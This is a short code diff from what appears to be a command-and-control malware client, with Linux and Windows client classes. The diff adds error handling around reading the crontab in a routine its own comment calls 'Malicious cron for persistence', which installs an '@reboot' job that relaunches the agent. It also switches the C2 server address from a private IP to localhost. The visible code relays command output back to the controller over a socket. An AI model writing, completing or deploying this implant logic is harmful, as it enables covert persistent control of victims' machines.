@@ -231,8 +231,10 @@ class LinuxClient(Client):
             return 1
 
         # Read whole current crontab
-        crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
-
+        try:
+            crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
+        except:
+            return 0
         # Malicious cron for persistence
         job = f"@reboot bash -c {self.agent_path}\n"
         
@@ -265,7 +267,7 @@ class LinuxClient(Client):
             self.secure_sock.sendall(output.encode())
 
 if __name__ == "__main__":
-    C2_IP = '10.33.5.176'
+    C2_IP = '127.0.0.1'
     C2_PORT = 8888
     if platform.system() == 'Windows':
         client = WindowsClient(C2_IP, C2_PORT)
